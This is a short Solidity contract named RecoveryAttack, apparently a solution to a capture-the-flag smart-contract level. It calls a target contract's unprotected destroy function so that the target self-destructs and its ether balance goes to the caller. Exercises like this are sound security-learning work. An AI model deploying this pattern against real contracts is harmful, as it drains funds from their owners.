// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IRecovery {
    function destroy(address payable _to) external payable;
}

contract RecoveryAttack {
    IRecovery private target;
    address payable recoveryAddress;

    constructor (address _targetAddress) {
        target = IRecovery(_targetAddress);
    }

    function attack() public {
        recoveryAddress = payable(msg.sender);
        target.destroy(recoveryAddress);

    }
}